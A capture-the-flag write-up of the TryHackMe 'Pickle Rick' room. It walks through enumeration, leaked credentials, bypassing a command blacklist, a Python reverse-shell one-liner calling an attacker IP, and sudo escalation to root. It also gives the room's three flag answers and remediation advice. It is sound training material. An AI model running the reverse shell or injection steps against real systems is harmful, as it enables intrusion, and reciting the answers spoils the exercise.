# Pickle Rick

## Summary

This challenge provides a Linux web server and asks the player to find three hidden ingredients by exploiting the web application. The skills used here are web enumeration, credential discovery through source code analysis, command injection via an unauthenticated web shell, command blacklist bypass, and privilege escalation to root.

**Platform:** TryHackMe  
**Room:** Pickle Rick  
**Category:** Web / Linux  

### Tools Used

- [nmap](https://nmap.org/) — port and service enumeration  
- [gobuster](https://github.com/OJ/gobuster) — web directory/file brute forcing  
- python3 — reverse shell execution  
- PentestMonkey Reverse Shell Cheatsheet — payload reference  

---

## Context

The target machine runs an Apache web server on port 80 and SSH on port 22. The goal is to find three ingredient flags hidden across the file system.

Initial access is gained through a login portal discovered via directory brute forcing, with credentials leaked directly in the page source code and `robots.txt`.

Once authenticated, the portal exposes a command panel that executes arbitrary OS commands as `www-data`, providing unauthenticated remote code execution.

Common file-reading commands like `cat` are blacklisted, requiring alternative techniques to read files.

The `www-data` user has unrestricted sudo privileges, making privilege escalation to root trivial.

---

## Vulnerability

This application contains two chained vulnerabilities:

### Credential Disclosure

- Username: `R1ckRul3s` is exposed in an HTML comment in the page source.
- Password: `Wubbalubbadubdub` is stored in plaintext in `robots.txt`.

These are publicly accessible and require no exploitation.

---

### Unauthenticated Command Injection

The `portal.php` command panel directly executes user input as OS commands without sanitization.

- This results in full command execution as `www-data`.
- A blacklist attempts to block commands like `cat`, `head`, `more`, `tail`, `nano`, `vim`, `vi`.
- This is trivial to bypass using alternative commands (`less`, `grep`, `tac`) or shell features.

---

## Exploitation

## Step 1 — Enumeration

Port scan:

```bash
nmap -sC -sV <TARGET_IP>
```

Findings:
- Port 22 → SSH
- Port 80 → HTTP

SSH is ignored due to lack of credentials.

---

### Source Code Discovery

HTML comment in page source:

```
Username: R1ckRul3s
```

---

### robots.txt leak

```
Wubbalubbadubdub
```

---

### Directory brute force

```bash
gobuster dir -u http://<TARGET_IP> \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x php,html,txt
```

Finds:
- `login.php`
- `portal.php`

---

## Step 2 — Login Access

Login credentials:

- Username: `R1ckRul3s`
- Password: `Wubbalubbadubdub`

This grants access to `portal.php` command panel.

---

## Step 3 — Ingredient 1 (www-data)

List files:

```bash
ls
```

Find:

```
Sup3rS3cretPickl3Ingred.txt
```

`cat` is blocked, so use:

```bash
less Sup3rS3cretPickl3Ingred.txt
```

**Ingredient 1:** `mr. meeseek hair`

---

Clue file:

```bash
less clue.txt
```

Hint indicates to explore filesystem.

---

## Step 4 — Ingredient 2 (/home/rick)

List home directory:

```bash
ls /home
```

Find:
- `ubuntu`
- `rick`

Locate file:

```bash
less "/home/rick/second ingredients"
```

**Ingredient 2:** `1 jerry tear`

---

## Step 5 — Reverse Shell (optional)

Listener:

```bash
nc -lvnp 9999
```

Reverse shell payload:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Stabilize shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Step 6 — Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

Result: `www-data` can run ALL commands as root.

Escalate:

```bash
sudo bash
```

---

## Step 7 — Ingredient 3 (/root)

```bash
ls /root
```

Find:
```
3rd.txt
```

Read:

```bash
less /root/3rd.txt
```

**Ingredient 3:** `fleeb juice`

---

## Remediation

### Remove exposed credentials

Credentials should never be placed in:
- HTML comments
- `robots.txt`
- any client-accessible files

Attackers routinely inspect these locations during enumeration.

---

### Fix command injection

The command panel directly executes system commands from user input, which is critical remote code execution.

A blacklist of commands (`cat`, `vim`, etc.) is not security — it is trivial to bypass.

Proper fixes:
- Remove OS command execution entirely
- If required, use strict allowlisting of exact commands
- Run execution in a sandbox with no filesystem or system access

---

### Enforce least privilege

The `www-data` user should never have unrestricted sudo access.

Granting full sudo (`ALL=(ALL) NOPASSWD:ALL`) means:
> any web exploit = full root compromise

Web services should run with minimal permissions required to function.

Written by Tatyana Ilieva 